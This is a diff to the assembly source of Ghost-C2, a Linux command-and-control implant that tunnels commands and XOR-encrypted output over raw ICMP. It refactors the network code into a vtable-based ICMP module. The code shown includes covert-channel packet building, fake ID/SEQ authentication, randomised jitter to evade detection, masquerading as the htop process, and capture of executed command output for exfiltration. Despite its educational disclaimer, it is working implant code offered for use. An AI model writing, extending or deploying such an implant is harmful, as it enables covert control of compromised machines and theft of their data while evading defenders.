@@ -10,7 +10,7 @@ BITS 64
 ;     \|_______|\|__|\|__|\|_______|\_________\   \|__|        \|______\|_________|
 ;                                   \|_________|                                   
 ; ===================================================================================
-; Project      : Ghost-C2 (v3.6) - "The Invisible ICMP Phantom (PIC Edition)"
+; Project      : Ghost-C2 (v3.6.1) - "The Invisible ICMP Phantom (PIC Edition)"
 ; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
 ; Architecture : x86_64 Linux (Pure Assembly, Libc-free, 100% PIC)
 ; -----------------------------------------------------------------------------------
@@ -22,6 +22,8 @@ BITS 64
 ;   - Evasion     : Adaptive Jitter (Nanosleep) and RDTSC Timestamp Mimicry.
 ;	- Compression : dpcm-rle-hybrid-x64-compressor / https://github.com/JM00NJ/Vesqer-Baremetal-Compressor-DPCM-RLE-Hybrid-Engine
 ; -----------------------------------------------------------------------------------
+; License: GNU Affero General Public License v3.0 (AGPL-3.0)
+; Versions 3.6.0 and below are MIT. 3.6.1+ is AGPL-3.0.
 ; Disclaimer: This tool is developed for educational and authorized penetration 
 ; testing purposes only. The author is not responsible for any misuse.
 ; -----------------------------------------------------------------------------------
@@ -64,6 +66,23 @@ _start:
     and rsp, -16
 
     mov rbp, rsp ; anchor
+    
+    ; ================================================================
+    ; 🧠 YENİ: AĞ YÖNLENDİRİCİSİ (VTABLE) KURULUMU
+    ; ================================================================
+    ; Ajanı ICMP modunda başlatıyoruz. (PIC uyumlu olması için 'rel' kullanıyoruz)
+    
+    lea rax, [rel _icmp_init]
+    mov [rbp + 0x3000], rax       ; Ağ Başlatma Fonksiyonu
+
+    lea rax, [rel _icmp_recv]
+    mov [rbp + 0x3008], rax       ; Veri Dinleme Fonksiyonu
+
+    lea rax, [rel _icmp_send]
+    mov [rbp + 0x3010], rax       ; Veri Gönderme Fonksiyonu
+    ; ================================================================
+    
+    
     ; Stack'te kendimize güvenli R-W alanlar belirliyoruz:
     ; icmp_packet kopyası -> [rsp + 0x1000]
     ; delay_req kopyası   -> [rsp + 0x1100]
@@ -81,14 +100,8 @@ _start:
     ; Step 2: Create a new session
     mov rax, 112                ; sys_setsid
     syscall
-    ; Step 3: Create Raw ICMP Socket
-    mov rax, 40
-    add rax, 1                 ; sys_socket
-    mov rdi, 2                  ; AF_INET
-    mov rsi, 3                  ; SOCK_RAW
-    mov rdx, 1                  ; IPPROTO_ICMP
-    syscall                     
-    mov [rbp + 0x10], eax            
+	; Step 3: Ağ Modülünü Başlat (Hangi protokol VTable'da ise o çalışır)
+    call [rbp + 0x3000]
 _sniff:
     ; Initialize sockaddr parameters for recvfrom
     mov dword [rbp + 0x14], 16           
@@ -186,40 +199,6 @@ _contiune:
     mov rdx, 1                       
     syscall
     jmp _execute_command            
-; --- UTILITY: ICMP CHECKSUM CALCULATION ---
-_checksum_cal:
-    mov word [rbp + 0x100 + 2], 0          
-    xor rcx, rcx                    
-    xor r13, r13                    
-    xor rax, rax                    
-    xor r11d, r11d                  
-    ; Header(8) + Mimicry(24) = 32 Base Bytes
-    mov rcx, 32                     
-    add rcx, r12                    ; Add dynamic payload length
-    mov r13, 0                      
-    xor rbx, rbx                    
-.checksum_loop:
-    movzx r11d, word [rbp + 0x100 + r13] 
-    add eax, r11d                   
-    add r13, 2                      
-    sub rcx, 2                      
-    cmp rcx, 2                      
-    jge .checksum_loop              
-    cmp rcx, 1                      
-    je .final                       
-    jmp .wrap                       
-.final:
-movzx r11d, word [rbp + 0x100 + r13] 
-    add eax, r11d                  
-.wrap:
-    mov ebx, eax                    
-    shr ebx, 16                     ; Carry management
-    and eax, 0xFFFF                
-    add ax, bx                     
-    adc ax, 0                      
-    not ax                         ; One's complement
-    mov word[rbp + 0x100 + 2], ax              
-    ret
 _wait_for_child:
     mov rax, 61                     ; sys_wait4
     mov rsi, 0                      
@@ -291,46 +270,21 @@ _chunk_loop:
     rep stosb                       
     ; Update dynamic timestamp for stealth
     rdtsc                           
-    mov [rbp + 0x100 + 8], rax      
-    call _create_seq_id
+    mov [rbp + 0x100 + 8], rax
+    
+    
+    
     lea rsi, [rbp + 0x100000 + r15]
     lea rdi, [rbp + 0x100 + 32]     ; Copy actual encrypted chunk
     mov rcx, r12
-    rep movsb                       
+    rep movsb       
+                    
     lea rsi, [rbp + 0x100 + 32]
     mov rcx, r12
     call _xor_cipher
 .packet_send:
-    call _checksum_cal
-    mov rax, 44                     ; sys_sendto
-    mov edi, dword [rbp + 0x10]              
-    lea rsi, [rbp + 0x100]          
-    lea rdx, [r12 + 32]             ; Packet size: Header(8) + Mimicry(24) + Payload(r12)
-    mov r10, 0               
-    lea r8, [rbp + 0x20]         
-    mov r9, 16               
-    syscall
-    ; --- JITTER MECHANISM ---
-    push rax                
-    push rcx                
-    push r11                
-    push rdx                
-rdtsc
-    xor rdx, rdx
-    mov ecx, 900000000
-    div ecx                  ; RDX = 0 ile 900ms arası rastgele bir değer olur
-    add edx, 100000000       ; En az 100ms ekle
-    mov qword [rbp + 0x200], 0      ; tv_sec = 0 (Saniye kısmını sıfırla!)
-    mov qword [rbp + 0x208], rdx    ; tv_nsec = Rastgele nanosaniye
-    mov rax, 35                     ; sys_nanosleep
-    lea rdi, [rbp + 0x200]            
-    lea rsi, [rbp + 0x200 +16]           
-    syscall
-    pop rdx
-    pop r11                 
-    pop rcx
-    pop rax
-    ;-----------------------
+    call [rbp + 0x3010]
+
     sub r14, r12                    ; Decrease remaining bytes
     add r15, r12                    ; Advance read offset
     jmp _chunk_loop                 
@@ -348,14 +302,7 @@ rdtsc
     rep stosb                       
     rdtsc
     mov [rbp + 0x100 + 8], rax
-    call _create_seq_id
-    mov rax, 44
-    mov rdi, [rbp + 0x10]
-    lea rsi, [rbp + 0x100]
-    mov rdx, 33                     ; Header(8) + Mimicry(24) + EOF(1)
-    lea r8, [rbp + 0x20]
-    mov r9, 16
-    syscall
+	call [rbp + 0x3010]
     jmp _sniff                      
 _execve:
     ; Redirection: Bind stdout/stderr to memfd
@@ -413,23 +360,7 @@ _xor_cipher:
     pop rsi                         
 .done:
     ret
-_create_seq_id:
-    ; 1. Generate a random number (1-119) for the Identifier
-    rdtsc
-    xor edx, edx    ; Clear EDX before division
-    mov ecx, 20000
-    div ecx         ; EDX now contains the remainder (0-118)
-    add edx,10000         ; EDX is now a random number between 10000 and 29999 (ID)
-    ; 2. Calculate the Sequence number for Asymmetric Return
-    mov eax, 55000    ; Load the asymmetric return key (55000) into EAX
-    sub eax, edx    ; EAX = 150 - EDX (This becomes the SEQ value)
-    ; 3. Network Byte Order (Endianness) Correction
-    xchg dl, dh     ; Swap lower 16 bits of EDX (DX)
-    xchg al, ah     ; Swap lower 16 bits of EAX (AX)
-    ; 4. Inject into the ICMP packet structure
-    mov word [rbp + 0x100 + 4], dx
-    mov word [rbp + 0x100 + 6], ax
-    ret             ; Return to caller
+
 _htop_masquerade:
     mov rax,157
     mov rdi,15
@@ -540,6 +471,111 @@ _vesqer_compress:
     pop rdi
     pop rsi
     pop rbx
+    ret
+ 
+ 
+ 
+; =================================================================
+; GHOST-C2 PROTOCOL MODULE: ICMP
+; =================================================================
+
+_icmp_init:
+    mov rax, 40
+    add rax, 1                  ; sys_socket
+    mov rdi, 2                  ; AF_INET
+    mov rsi, 3                  ; SOCK_RAW
+    mov rdx, 1                  ; IPPROTO_ICMP
+    syscall                     
+    mov [rbp + 0x10], eax       
+    ret
+
+_icmp_send:
+    ; --- ICMP'ye ÖZEL ÖN HAZIRLIK ---
+	call _create_seq_id         ; Paketin ID ve SEQ numaralarını (Auth) basar
+    call _checksum_cal          ; Paketin checksum'ını hesaplar ve mühürler
+    ; --- GÖNDERME İŞLEMİ ---
+    mov rax, 44                 ; sys_sendto
+    mov edi, dword [rbp + 0x10] 
+    lea rsi, [rbp + 0x100]      
+    lea rdx, [r12 + 32]         ; Header(8) + Mimicry(24) + Payload(r12)
+    mov r10, 0               
+    lea r8, [rbp + 0x20]        
+    mov r9, 16               
+    syscall
+
+    ; --- ICMP'YE ÖZEL JITTER ---
+    push rax                
+    push rcx                
+    push r11                
+    push rdx                
+    rdtsc
+    xor rdx, rdx
+    mov ecx, 900000000
+    div ecx                  
+    add edx, 100000000       
+    mov qword [rbp + 0x200], 0      
+    mov qword [rbp + 0x208], rdx    
+    mov rax, 35                     
+    lea rdi, [rbp + 0x200]            
+    lea rsi, [rbp + 0x200 +16]            
+    syscall
+    pop rdx
+    pop r11                 
+    pop rcx
+    pop rax
+    ret
+
+; --- ICMP ÖZEL: ID/SEQ Üretimi ---
+_create_seq_id:
+    rdtsc
+    xor edx, edx
+    mov ecx, 20000
+    div ecx
+    add edx, 10000          ; Random ID (10k - 30k)
+    mov eax, 55000          ; Auth Key Sum
+    sub eax, edx            ; EAX = SEQ
+    xchg dl, dh             ; Endianness
+    xchg al, ah
+    mov word [rbp + 0x100 + 4], dx
+    mov word [rbp + 0x100 + 6], ax
+    ret
+
+; --- ICMP ÖZEL: Checksum Hesaplama ---
+_checksum_cal:
+    mov word [rbp + 0x100 + 2], 0          
+    xor rcx, rcx                    
+    xor r13, r13                    
+    xor rax, rax                    
+    xor r11d, r11d                  
+    mov rcx, 32                     
+    add rcx, r12                    
+    mov r13, 0                      
+    xor rbx, rbx                    
+.checksum_loop:
+    movzx r11d, word [rbp + 0x100 + r13] 
+    add eax, r11d                    
+    add r13, 2                      
+    sub rcx, 2                      
+    cmp rcx, 2                      
+    jge .checksum_loop              
+    cmp rcx, 1                      
+    je .final                       
+    jmp .wrap                       
+.final:
+    movzx r11d, byte [rbp + 0x100 + r13] 
+    add eax, r11d                  
+.wrap:
+    mov ebx, eax                    
+    shr ebx, 16                     
+    and eax, 0xFFFF                 
+    add ax, bx                      
+    adc ax, 0                       
+    not ax                          
+    mov word[rbp + 0x100 + 2], ax               
+    ret
+_icmp_recv:
+    ; Şimdilik ana döngüde (_sniff) sys_recvfrom kullandığımız için burası boş.
+    ; Ama VTable'da adresi geçtiği için bu etiketin (label) burada tanımlı olması şart.
     ret
 _exit:
     mov rax, 60                     ; sys_exit
